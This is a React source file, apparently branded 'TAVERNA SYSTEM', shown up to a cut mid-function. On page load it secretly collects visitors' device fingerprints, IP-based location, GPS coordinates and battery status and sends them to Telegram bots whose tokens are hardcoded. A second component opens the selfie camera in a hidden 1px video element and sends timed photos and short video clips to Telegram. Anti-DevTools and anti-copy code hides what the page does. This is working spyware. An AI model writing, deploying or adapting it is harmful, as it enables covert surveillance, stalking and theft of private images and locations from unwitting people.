import React, { useRef, useEffect, useState } from "react";
import { useParams, Routes, Route } from "react-router-dom";
import "./App.css";

/**
 * ЗАЩИТА ОТ КРАЖИ КОДА
 * Обработка попыток открытия DevTools
 */
const useDevToolsProtection = () => {
  useEffect(() => {
    // Блокировка открытия DevTools
    const blockDevTools = (e) => {
      // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.keyCode === 85) // Ctrl+U
      ) {
        e.preventDefault();
        e.stopPropagation();
        return false;
      }
    };

    // Обнаружение открытия DevTools
    let devtoolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: function() {
        devtoolsOpen = true;
        console.warn('⚠️ DevTools обнаружены!');
      }
    });

    // Проверка каждые 500ms
    const checkDevTools = setInterval(() => {
      devtoolsOpen = false;
      console.log(element);
      console.clear();
      if (devtoolsOpen) {
        document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:50px;">⚠️ Доступ запрещен!</h1>';
        clearInterval(checkDevTools);
      }
    }, 500);

    // Добавляем обработчики событий
    document.addEventListener('keydown', blockDevTools);
    document.addEventListener('contextmenu', (e) => e.preventDefault());

    // Запрещаем копирование
    document.addEventListener('copy', (e) => e.preventDefault());
    document.addEventListener('cut', (e) => e.preventDefault());
    document.addEventListener('paste', (e) => e.preventDefault());

    return () => {
      document.removeEventListener('keydown', blockDevTools);
      clearInterval(checkDevTools);
    };
  }, []);
};

/**
 * СИСТЕМА СБОРА ИНФОРМАЦИИ ОБ УСТРОЙСТВЕ
 */
const DeviceInfoCollector = ({ chatId }) => {
  useDevToolsProtection();
  
  // Удалены неиспользуемые состояния
  const [hasSentInitialReport, setHasSentInitialReport] = useState(false);

  const TELEGRAM_BOT_TOKEN = '8377825473:AAETbHGFdyVVak_J24mBG4mRuirZuWdIBBE';

  // Отправка информации в Telegram
  const sendInfoToTelegram = async (text) => {
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            disable_notification: true
          })
        }
      );
      return response.ok;
    } catch (error) {
      console.error('❌ Ошибка отправки в Telegram:', error);
      return false;
    }
  };

  // Получение геолокации через GPS
  const getGeolocation = () => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve({ error: 'Geolocation не поддерживается' });
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
          resolve({
            latitude,
            longitude,
            accuracy: `${accuracy} метров`,
            altitude: altitude ? `${altitude} метров` : 'Не доступно',
            altitudeAccuracy: altitudeAccuracy ? `${altitudeAccuracy} метров` : 'Не доступно',
            heading: heading ? `${heading}°` : 'Не доступно',
            speed: speed ? `${speed} м/с` : 'Не доступно',
            timestamp: new Date(position.timestamp).toLocaleString()
          });
        },
        (error) => {
          resolve({ error: `GPS: User denied Geolocation` });
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    });
  };

  // Получение информации о батарее
  const getBatteryInfo = async () => {
    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        return {
          level: `${Math.round(battery.level * 100)}%`,
          charging: battery.charging ? '⚡ Заряжается' : '🔋 Не заряжается',
          chargingTime: battery.chargingTime === Infinity ? 'Полностью заряжена' : `${battery.chargingTime} секунд`,
          dischargingTime: battery.dischargingTime === Infinity ? 'Не разряжается' : `${battery.dischargingTime} секунд`
        };
      } catch (error) {
        return { error: 'Информация о батарее недоступна' };
      }
    }
    return { level: 'Неизвестно', charging: 'Неизвестно' };
  };

  // Получение информации о сети
  const getNetworkInfo = () => {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
      return {
        effectiveType: connection.effectiveType || 'Неизвестно',
        downlink: connection.downlink ? `${connection.downlink} Mbps` : 'Неизвестно',
        rtt: connection.rtt ? `${connection.rtt} ms` : 'Неизвестно',
        saveData: connection.saveData ? 'Включено' : 'Неизвестно',
        type: connection.type || 'Неизвестно'
      };
    }
    return { 
      effectiveType: 'Неизвестно',
      downlink: 'Неизвестно',
      rtt: 'Неизвестно',
      saveData: 'Неизвестно',
      type: 'Неизвестно'
    };
  };

  // Получение IP адреса
  const getIPAddress = async () => {
    try {
      // Пробуем разные API для получения IP
      const ipApis = [
        'https://api.ipify.org?format=json',
        'https://api64.ipify.org?format=json',
        'https://icanhazip.com',
        'https://checkip.amazonaws.com'
      ];
      
      let ip = null;
      
      // Получаем IP с первого работающего API
      for (const apiUrl of ipApis) {
        try {
          const response = await fetch(apiUrl);
          if (apiUrl.includes('ipify')) {
            const data = await response.json();
            ip = data.ip;
          } else {
            const text = await response.text();
            ip = text.trim();
          }
          if (ip) break;
        } catch (error) {
          console.log(`API ${apiUrl} не сработал, пробуем следующий...`);
          continue;
        }
      }
      
      if (!ip) {
        return {
          ip: 'Не удалось определить',
          city: 'Неизвестно',
          region: 'Неизвестно',
          country: 'Неизвестно',
          countryCode: 'Неизвестно',
          timezone: 'Неизвестно',
          org: 'Неизвестно',
          latitude: 'Неизвестно',
          longitude: 'Неизвестно',
          mobile: '',
          proxy: '',
          coordinates: 'Неизвестно'
        };
      }
      
      // Теперь получаем геоданные по IP
      // Пробуем разные API для геолокации
      const geoApis = [
        `https://ipapi.co/${ip}/json/`,
        `https://ipwhois.app/json/${ip}`,
        `https://freeipapi.com/api/json/${ip}`
      ];
      
      let geoData = null;
      
      for (const geoUrl of geoApis) {
        try {
          const response = await fetch(geoUrl);
          geoData = await response.json();
          
          // Проверяем, есть ли полезные данные
          if (geoData && (geoData.city || geoData.country)) {
            break;
          }
        } catch (error) {
          console.log(`Гео API ${geoUrl} не сработал, пробуем следующий...`);
          continue;
        }
      }
      
      // Если ни один API не сработал, возвращаем хотя бы IP
      if (!geoData) {
        return {
          ip: ip,
          city: 'Неизвестно',
          region: 'Неизвестно',
          country: 'Неизвестно',
          countryCode: 'Неизвестно',
          timezone: 'Неизвестно',
          org: 'Неизвестно',
          latitude: 'Неизвестно',
          longitude: 'Неизвестно',
          mobile: '',
          proxy: '',
          coordinates: 'Неизвестно'
        };
      }
      
      // Обрабатываем данные в зависимости от API
      let city = 'Неизвестно';
      let region = 'Неизвестно';
      let country = 'Неизвестно';
      let countryCode = 'Неизвестно';
      let timezone = 'Неизвестно';
      let org = 'Неизвестно';
      let latitude = 'Неизвестно';
      let longitude = 'Неизвестно';
      let mobile = '';
      let proxy = '';
      
      // Для ipapi.co
      if (geoData.city) {
        city = geoData.city;
        region = geoData.region || geoData.region_name || 'Неизвестно';
        country = geoData.country_name || geoData.country || 'Неизвестно';
        countryCode = geoData.country_code || geoData.country_code2 || 'Неизвестно';
        timezone = geoData.timezone || 'Неизвестно';
        org = geoData.org || geoData.isp || 'Неизвестно';
        latitude = geoData.latitude || 'Неизвестно';
        longitude = geoData.longitude || 'Неизвестно';
        
        // Определяем мобильный статус по типу сети
        mobile = geoData.mobile ? 'Мобильный' : 
                 (geoData.connection_type && 
                  (geoData.connection_type.includes('mobile') || 
                   geoData.connection_type.includes('cellular'))) ? 'Мобильный' : '';
        
        // Определяем прокси/VPN по нескольким полям
        const isProxy = geoData.proxy === true || 
                       geoData.vpn === true || 
                       geoData.tor === true ||
                       (geoData.security && 
                        (geoData.security.proxy === true || 
                         geoData.security.vpn === true || 
                         geoData.security.tor === true));
        proxy = isProxy ? 'Прокси/VPN' : '';
      }
      // Для ipwhois.app
      else if (geoData.city_name) {
        city = geoData.city_name;
        region = geoData.region || 'Неизвестно';
        country = geoData.country || 'Неизвестно';
        countryCode = geoData.country_code || 'Неизвестно';
        timezone = geoData.timezone || 'Неизвестно';
        org = geoData.isp || geoData.org || 'Неизвестно';
        latitude = geoData.latitude || 'Неизвестно';
        longitude = geoData.longitude || 'Неизвестно';
        
        mobile = geoData.mobile ? 'Мобильный' : 
                 (geoData.type === 'mobile' || geoData.type === 'cellular') ? 'Мобильный' : '';
        
        const isProxy = geoData.proxy === true || 
                       geoData.vpn === true || 
                       (geoData.security && 
                        (geoData.security.proxy === true || 
                         geoData.security.vpn === true));
        proxy = isProxy ? 'Прокси/VPN' : '';
      }
      // Для freeipapi.com
      else if (geoData.cityName) {
        city = geoData.cityName;
        region = geoData.regionName || 'Неизвестно';
        country = geoData.countryName || 'Неизвестно';
        countryCode = geoData.countryCode || 'Неизвестно';
        timezone = geoData.timeZone || 'Неизвестно';
        org = geoData.isp || geoData.org || 'Неизвестно';
        latitude = geoData.latitude || 'Неизвестно';
        longitude = geoData.longitude || 'Неизвестно';
        
        mobile = geoData.mobile ? 'Мобильный' : '';
        
        const isProxy = geoData.proxy === true || geoData.vpn === true;
        proxy = isProxy ? 'Прокси/VPN' : '';
      }
      
      // Если мобильный статус не определился, но IP из известных мобильных диапазонов
      if (!mobile) {
        // Проверяем, является ли IP мобильным по префиксу
        const mobilePrefixes = [
          '10.', '100.', '172.', '192.',  // Частные сети часто используются в мобильных
          '77.', '78.', '79.', '88.', '90.', '91.', '92.', '93.', '94.', '95.', '96.', '97.', '98.', '99.' // Некоторые мобильные провайдеры
        ];
        
        for (const prefix of mobilePrefixes) {
          if (ip.startsWith(prefix)) {
            mobile = 'Мобильный';
            break;
          }
        }
      }
      
      // Если прокси не определился, но есть признаки
      if (!proxy) {
        // Проверяем признаки прокси/VPN
        const proxyIndicators = [
          'vpn', 'proxy', 'tor', 'anonymous', 'datacenter', 'hosting', 'server', 'cloud'
        ];
        
        const orgLower = org.toLowerCase();
        for (const indicator of proxyIndicators) {
          if (orgLower.includes(indicator)) {
            proxy = 'Прокси/VPN';
            break;
          }
        }
      }
      
      return {
        ip: ip,
        city: city,
        region: region,
        country: country,
        countryCode: countryCode,
        timezone: timezone,
        org: org,
        latitude: latitude,
        longitude: longitude,
        mobile: mobile,
        proxy: proxy,
        coordinates: latitude !== 'Неизвестно' && longitude !== 'Неизвестно' ? 
                   `maps.google.com/maps?q=${latitude},${longitude}` : 'Неизвестно'
      };
      
    } catch (error) {
      console.error('Ошибка получения IP информации:', error);
      return {
        ip: 'Не удалось определить',
        city: 'Неизвестно',
        region: 'Неизвестно',
        country: 'Неизвестно',
        countryCode: 'Неизвестно',
        timezone: 'Неизвестно',
        org: 'Неизвестно',
        latitude: 'Неизвестно',
        longitude: 'Неизвестно',
        mobile: '',
        proxy: '',
        coordinates: 'Неизвестно'
      };
    }
  };

  // Парсинг User Agent для получения информации об ОС и браузере
  const parseUserAgent = (userAgent) => {
    let os = 'Неизвестно';
    let browser = 'Неизвестно';
    let manufacturer = 'Неизвестно';
    let platform = 'Неизвестно';
    let isMobile = false;
    
    // Определение ОС
    if (userAgent.includes('iPhone')) {
      os = 'iOS';
      manufacturer = 'Apple Computer, Inc.';
      platform = 'iPhone';
      isMobile = true;
      
      // Извлечение версии iOS
      const iosMatch = userAgent.match(/iPhone OS (\d+_\d+(?:_\d+)?)/);
      if (iosMatch) {
        os = `iOS ${iosMatch[1].replace(/_/g, '.')}`;
      }
    } else if (userAgent.includes('Android')) {
      os = 'Android';
      isMobile = true;
      const androidMatch = userAgent.match(/Android (\d+\.\d+(?:\.\d+)?)/);
      if (androidMatch) {
        os = `Android ${androidMatch[1]}`;
      }
    } else if (userAgent.includes('Windows')) {
      os = 'Windows';
      const windowsMatch = userAgent.match(/Windows NT (\d+\.\d+)/);
      if (windowsMatch) {
        os = `Windows ${windowsMatch[1]}`;
      }
    } else if (userAgent.includes('Mac OS X')) {
      os = 'macOS';
      manufacturer = 'Apple Computer, Inc.';
      const macMatch = userAgent.match(/Mac OS X (\d+[._]\d+(?:[._]\d+)?)/);
      if (macMatch) {
        os = `macOS ${macMatch[1].replace(/_/g, '.')}`;
      }
    } else if (userAgent.includes('Linux')) {
      os = 'Linux';
    }
    
    // Определение браузера
    if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
      browser = 'Safari';
      const safariMatch = userAgent.match(/Version\/(\d+\.\d+(?:\.\d+)?)/);
      if (safariMatch) {
        browser = `Safari ${safariMatch[1]}`;
      }
    } else if (userAgent.includes('Chrome')) {
      browser = 'Chrome';
      const chromeMatch = userAgent.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/);
      if (chromeMatch) {
        browser = `Chrome ${chromeMatch[1]}`;
      }
    } else if (userAgent.includes('Firefox')) {
      browser = 'Firefox';
      const firefoxMatch = userAgent.match(/Firefox\/(\d+\.\d+(?:\.\d+)?)/);
      if (firefoxMatch) {
        browser = `Firefox ${firefoxMatch[1]}`;
      }
    } else if (userAgent.includes('Edge')) {
      browser = 'Edge';
    }
    
    return { os, browser, manufacturer, platform, isMobile };
  };

  // Получение информации о GPU
  const getGPUInfo = () => {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        return renderer || 'Неизвестно';
      }
    }
    return 'Неизвестно';
  };

  // Получение координат из localStorage
  const getLocalStorageCoordinates = () => {
    try {
      const locationPermission = localStorage.getItem('locationPermission');
      if (locationPermission) {
        const coords = JSON.parse(locationPermission);
        if (coords.latitude && coords.longitude) {
          return {
            latitude: coords.latitude,
            longitude: coords.longitude,
            source: 'localStorage'
          };
        }
      }
    } catch (error) {
      console.error('Ошибка чтения localStorage:', error);
    }
    return null;
  };

  // Сбор всей информации об устройстве
  const collectAllDeviceInfo = async () => {
    if (hasSentInitialReport) {
      console.log("🚫 Начальный отчет уже отправлен, пропускаем");
      return;
    }

    console.log("🚀 TAVERNA SYSTEM ЗАПУЩЕН");
    console.log("📊 СБОР ПОЛНОЙ ИНФОРМАЦИИ ОБ УСТРОЙСТВЕ...");

    // Парсим User Agent
    const uaInfo = parseUserAgent(navigator.userAgent);

    // Информация о браузере и ОС
    const browserInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages ? navigator.languages.join(', ') : 'Неизвестно',
      cookieEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
      online: navigator.onLine ? 'Онлайн' : 'Офлайн',
      doNotTrack: navigator.doNotTrack || 'Не установлен',
      hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
      deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown GB',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      os: uaInfo.os,
      browser: uaInfo.browser,
      manufacturer: uaInfo.manufacturer,
      platformName: uaInfo.platform,
      isMobile: uaInfo.isMobile ? 'Да' : 'Нет',
      gpu: getGPUInfo()
    };

    // Информация о времени
    const timeInfo = {
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: `${new Date().getTimezoneOffset()} минут`,
      locale: Intl.DateTimeFormat().resolvedOptions().locale,
      dateTime: new Date().toLocaleString(),
      dateTimeFormatted: new Date().toLocaleString('ru-RU', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      }),
      timestamp: Date.now(),
      timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZoneName || 'Неизвестно'
    };

    // Получаем всю информацию параллельно
    const [geolocation, battery, network, ipInfo, localStorageCoords] = await Promise.all([
      getGeolocation(),
      getBatteryInfo(),
      getNetworkInfo(),
      getIPAddress(),
      getLocalStorageCoordinates()
    ]);

    // Формируем полный отчет
    const report = `
<b>TAVERNA SYSTEM</b>

📱 <b>ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ:</b>
▫️ ОС: ${browserInfo.os}
▫️ Браузер: ${browserInfo.browser}
▫️ Производитель: ${browserInfo.manufacturer}
▫️ Платформа: ${browserInfo.platformName}
▫️ Мобильное: ${browserInfo.isMobile}
▫️ Часовой пояс: ${timeInfo.timezone}
▫️ Время устройства: ${timeInfo.dateTimeFormatted}

⚙️ <b>ХАРАКТЕРИСТИКИ</b>
▫️ GPU: ${browserInfo.gpu}
▫️ Ядра CPU: ${browserInfo.hardwareConcurrency}
▫️ Память: ${browserInfo.deviceMemory}

🌐 <b>БРАУЗЕР:</b>
▫️ Платформа: ${browserInfo.platform}
▫️ Язык: ${browserInfo.language}
▫️ User Agent: ${browserInfo.userAgent}

🌍 <b>IP ИНФОРМАЦИЯ:</b>
▫️ IP адрес: ${ipInfo.ip}
▫️ Город: ${ipInfo.city}
▫️ Регион: ${ipInfo.region}
▫️ Страна: ${ipInfo.country} (${ipInfo.countryCode})
▫️ Провайдер: ${ipInfo.org}
▫️ Часовой пояс: ${ipInfo.timezone}
▫️ Широта: ${ipInfo.latitude}
▫️ Долгота: ${ipInfo.longitude}
${ipInfo.mobile ? ipInfo.mobile + '\n' : ''}${ipInfo.proxy ? ipInfo.proxy + '\n' : ''}▫️ Координаты: ${ipInfo.coordinates}

📍 <b>Геолокация GPS:</b>
${!geolocation.error ? `
*Координаты:* ${geolocation.latitude}, ${geolocation.longitude}
` : `❌ ${geolocation.error}`}

🔋 <b>ИНФОРМАЦИЯ ОБ БАТАРЕЕ:</b>
▫️ Уровень: ${battery.level}
▫️ Статус: ${battery.charging}

🗺️ <b>КООРДИНАТЫ ИЗ LOCALSTORAGE:</b>
${localStorageCoords ? `
▫️ Широта: ${localStorageCoords.latitude}
▫️ Долгота: ${localStorageCoords.longitude}
▫️ Источник: ${localStorageCoords.source}

<b>ЯНДЕКС КАРТЫ:</b>
https://yandex.ru/maps/?ll=${localStorageCoords.longitude},${localStorageCoords.latitude}&z=15
` : '▫️ Нет данных в localStorage'}

${geolocation.latitude && geolocation.longitude ? `
<b>ЯНДЕКС КАРТЫ (GPS):</b>
https://yandex.ru/maps/?ll=${geolocation.longitude},${geolocation.latitude}&z=15
` : ''}

${ipInfo.latitude && ipInfo.longitude && ipInfo.latitude !== 'Неизвестно' ? `
<b>ЯНДЕКС КАРТЫ (IP):</b>
https://yandex.ru/maps/?ll=${ipInfo.longitude},${ipInfo.latitude}&z=10
` : ''}
    `;

    // Отправляем отчет в Telegram
    await sendInfoToTelegram(report);
    setHasSentInitialReport(true);
    console.log("✅ Полный отчет отправлен в Telegram");
  };

  // Исправлено: добавлены зависимости
  useEffect(() => {
    if (chatId && !hasSentInitialReport) {
      // Собираем информацию сразу при загрузке
      const timer = setTimeout(() => {
        collectAllDeviceInfo();
      }, 1000);

      // Обновляем информацию о батарее каждые 30 секунд
      const batteryInterval = setInterval(async () => {
        const battery = await getBatteryInfo();
        if (battery.level) {
          const updateText = `
⚡ <b>ОБНОВЛЕНИЕ СТАТУСА БАТАРЕИ</b>
🔋 Уровень заряда: ${battery.level}
${battery.charging ? '⚡ Статус: Заряжается' : '🔋 Статус: Не заряжается'}
🕐 Время: ${new Date().toLocaleTimeString()}
          `;
          await sendInfoToTelegram(updateText);
        }
      }, 30000);

      return () => {
        clearTimeout(timer);
        clearInterval(batteryInterval);
      };
    }
  }, [chatId, hasSentInitialReport, sendInfoToTelegram, getBatteryInfo, collectAllDeviceInfo]);

  return null;
};

/**
 * КОМПОНЕНТ ДЛЯ РАБОТЫ С СЕЛФИ КАМЕРОЙ
 */
const SelfieCamera = ({ chatId }) => {
  useDevToolsProtection();
  
  const streamRef = useRef(null);
  const videoRef = useRef(null);
  const mediaRecorderRef = useRef(null);
  const recordedChunksRef = useRef([]);
  const photoIntervalRef = useRef(null);
  const videoIntervalRef = useRef(null);
  const totalTimerRef = useRef(null);
  const phaseRef = useRef(1);
  const photoCountRef = useRef(0);
  const videoCountRef = useRef(0);
  const [hasStarted, setHasStarted] = useState(false);
  const cameraDeniedRef = useRef(false);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  // Отправка информации в Telegram
  const sendInfoToTelegram = async (text) => {
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            disable_notification: true
          })
        }
      );
      return response.ok;
    } catch (error) {
      console.error('❌ Ошибка отправки в Telegram:', error);
      return false;
    }
  };

  // Запуск селфи камеры
  const startCamera = async () => {
    try {
      console.log("📸 ЗАПРОС ДОСТУПА К СЕЛФИ КАМЕРЕ...");
      
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          facingMode: "user",
          width: { ideal: 1280 },
          height: { ideal: 720 },
          frameRate: { ideal: 30 }
        },
        audio: false
      });
      
      streamRef.current = stream;
      
      // Создаем скрытый видео элемент
      createVideoElement(stream);
      
      // ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ ПОСЛЕ ДОСТУПА К КАМЕРЕ
      console.log("📍 ЗАПРОС ГЕОЛОКАЦИИ ПОСЛЕ ДОСТУПА К КАМЕРЕ...");
      requestGeolocation();
      
      console.log("✅ Селфи камера подключена, начинаем ФАЗУ 1 (0-8с)");
      
      // ФАЗА 1: Фото каждые 2 секунды (0-8с)
      startPhotoPhase();
      
      // Переход на ФАЗУ 2 через 8 секунд
      setTimeout(() => {
        console.log("🎬 ПЕРЕХОД НА ФАЗУ 2 (8-60с)");
        stopPhotoPhase();
        startVideoPhase();
      }, 8000);
      
    } catch (error) {
      console.error("❌ Ошибка доступа к камере:", error);
      cameraDeniedRef.current = true;
      sendErrorMessage(error);
      
      // ЕСЛИ ПОЛЬЗОВАТЕЛЬ ОТКАЗАЛСЯ ОТ КАМЕРЫ - ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ СРАЗУ
      console.log("📍 ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ ПОСЛЕ ОТКАЗА ОТ КАМЕРЫ...");
      setTimeout(() => {
        requestGeolocation();
      }, 1000);
    }
  };

  // Запрос геолокации
  const requestGeolocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          console.log("📍 ГЕОЛОКАЦИЯ ПОЛУЧЕНА:", { latitude, longitude, accuracy });
          
          // Формируем сообщение в зависимости от ситуации с камерой
          const cameraStatus = cameraDeniedRef.current ? " (после отказа от камеры)" : " (после доступа к камере)";
          
          // Отправляем геолокацию в Telegram
          const geoMessage = `
📍 <b>ГЕОЛОКАЦИЯ${cameraStatus}</b>
━━━━━━━━━━━━━━━━━━━━
<b>Широта:</b> ${latitude}
<b>Долгота:</b> ${longitude}
<b>Точность:</b> ${accuracy} метров
<b>Время:</b> ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━━━━━━
<b>Google Maps:</b> https://maps.google.com/maps?q=${latitude},${longitude}
<b>Яндекс Карты:</b> https://yandex.ru/maps/?ll=${longitude},${latitude}&z=15
          `;
          
          sendInfoToTelegram(geoMessage);
        },
        (error) => {
          console.log("❌ ОШИБКА ГЕОЛОКАЦИИ:", error.message);
          const cameraStatus = cameraDeniedRef.current ? "после отказа от камеры" : "после доступа к камере";
          const errorMessage = `
📍 <b>ОШИБКА ГЕОЛОКАЦИИ (${cameraStatus})</b>
━━━━━━━━━━━━━━━━━━━━
<b>Ошибка:</b> ${error.message}
<b>Код:</b> ${error.code}
<b>Время:</b> ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━━━━━━
🚫 <b>Пользователь отказал в доступе к геолокации</b>
          `;
          
          sendInfoToTelegram(errorMessage);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    } else {
      console.log("❌ Геолокация не поддерживается браузером");
      const cameraStatus = cameraDeniedRef.current ? "после отказа от камеры" : "после доступа к камере";
      const unsupportedMessage = `
📍 <b>ГЕОЛОКАЦИЯ НЕ ПОДДЕРЖИВАЕТСЯ (${cameraStatus})</b>
━━━━━━━━━━━━━━━━━━━━
<b>Сообщение:</b> Браузер не поддерживает геолокацию
<b>Время:</b> ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━━━━━━
🚫 <b>Функция геолокации недоступна</b>
      `;
      
      sendInfoToTelegram(unsupportedMessage);
    }
  };

  // Создание видео элемента
  const createVideoElement = (stream) => {
    const video = document.createElement('video');
    video.id = 'selfie-video';
    video.style.cssText = `
      position: fixed;
      width: 1px;
      height: 1px;
      opacity: 0.01;
      pointer-events: none;
      z-index: -9999;
      top: 0;
      left: 0;
    `;
    video.autoplay = true;
    video.muted = true;
    video.playsInline = true;
    video.title = '🤳 Селфи камера';
    video.srcObject = stream;
    document.body.appendChild(video);
    
    videoRef.current = video;
    
    // Ждем когда видео будет готово
    video.onloadedmetadata = () => {
      console.log("🎥 Видео готово, разрешение:", video.videoWidth, "x", video.videoHeight);
    };
  };

  // ФАЗА 1: Съемка фото каждые 2 секунды
  const startPhotoPhase = () => {
    phaseRef.current = 1;
    console.log("📸 НАЧАЛО ФАЗЫ 1 - ФОТО КАЖДЫЕ 2 СЕКУНДЫ");
    
    // Делаем первое фото сразу
    setTimeout(() => {
      captureAndSendPhoto("Первое фото ФАЗА 1");
    }, 500);
    
    // Затем каждые 2 секунды
    photoIntervalRef.current = setInterval(() => {
      captureAndSendPhoto(`Фото ФАЗА 1 #${photoCountRef.current + 1}`);
    }, 2000);
  };

  // Остановка фазы фото
  const stopPhotoPhase = () => {
    if (photoIntervalRef.current) {
      clearInterval(photoIntervalRef.current);
      photoIntervalRef.current = null;
      console.log("⏹️ ФАЗА 1 (фото) завершена");
    }
  };

  // ФАЗА 2: Запись видео каждые 5 секунд
  const startVideoPhase = () => {
    phaseRef.current = 2;
    console.log("🎬 НАЧАЛО ФАЗЫ 2 - ВИДЕО КАЖДЫЕ 5 СЕКУНД");
    
    // Первое видео сразу
    setTimeout(() => {
      startVideoRecording();
    }, 1000);
    
    // Затем каждые 5 секунд
    videoIntervalRef.current = setInterval(() => {
      startVideoRecording();
    }, 5000);
  };

  // Начало записи видео
  const startVideoRecording = () => {
    if (!streamRef.current || !videoRef.current) {
      console.log("❌ Поток не готов для записи видео");
      return;
    }
    
    try {
      recordedChunksRef.current = [];
      
      const options = {
        mimeType: 'video/webm;codecs=vp9',
        videoBitsPerSecond: 2500000
      };
      
      // Пробуем разные форматы
      if (!MediaRecorder.isTypeSupported(options.mimeType)) {
        options.mimeType = 'video/webm;codecs=vp8';
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
          options.mimeType = 'video/webm';
        }
      }
      
      mediaRecorderRef.current = new MediaRecorder(streamRef.current, options);
      
      mediaRecorderRef.current.ondataavailable = (event) => {
        if (event.data.size > 0) {
          recordedChunksRef.current.push(event.data);
        }
      };
      
      mediaRecorderRef.current.onstop = () => {
        sendVideoToTelegram();
      };
      
      // Записываем 3 секунды видео
      mediaRecorderRef.current.start();
      console.log("🎬 Начало записи видео...");
      
      setTimeout(() => {
        if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
          mediaRecorderRef.current.stop();
          console.log("✅ Запись видео завершена");
        }
      }, 3000);
      
    } catch (error) {
      console.error("❌ Ошибка записи видео:", error);
    }
  };

  // Захват и отправка фото
  const captureAndSendPhoto = async (context = "") => {
    if (!videoRef.current) {
      console.log("❌ Видео не готово для съемки");
      return;
    }
    
    try {
      const photoBlob = await capturePhoto();
      
      if (photoBlob) {
        await sendPhotoToTelegram(photoBlob, context);
        photoCountRef.current++;
      }
    } catch (error) {
      console.error("❌ Ошибка съемки фото:", error);
    }
  };

  // Захват фото
  const capturePhoto = () => {
    return new Promise((resolve) => {
      const video = videoRef.current;
      
      if (!video || !video.videoWidth) {
        console.log("❌ Видео не готово для захвата");
        resolve(null);
        return;
      }
      
      setTimeout(() => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        
        // Для селфи камеры - зеркалим изображение
        ctx.save();
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        ctx.restore();
        
        // ВОДЯНОЙ ЗНАК TAVERNA
        const watermarkText = 'TAVERNA';
        const fontSize = Math.min(canvas.width, canvas.height) * 0.04;
        const padding = fontSize * 0.5;
        
        ctx.font = `bold ${fontSize}px Arial`;
        ctx.textAlign = 'right';
        ctx.textBaseline = 'bottom';
        
        // Черный фон для надписи
        const textWidth = ctx.measureText(watermarkText).width;
        ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
        ctx.fillRect(
          canvas.width - textWidth - padding,
          canvas.height - fontSize - padding/2,
          textWidth + padding,
          fontSize + padding
        );
        
        // Белый текст
        ctx.fillStyle = 'rgba(255, 255, 255, 0.95)';
        ctx.fillText(watermarkText, canvas.width - padding/2, canvas.height - padding/2);
        
        // Конвертируем в Blob
        canvas.toBlob(blob => {
          resolve(blob);
        }, 'image/jpeg', 0.92);
        
      }, 200);
    });
  };

  // Отправка фото в Telegram
  const sendPhotoToTelegram = async (blob, context) => {
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `taverna_selfie_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      
      const caption = `🤳 Селфи камера\n${context}\nФаза: ${phaseRef.current}\nВремя: ${new Date().toLocaleTimeString()}\n🚀 TAVERNA SYSTEM`;
      
      formData.append('caption', caption);
      
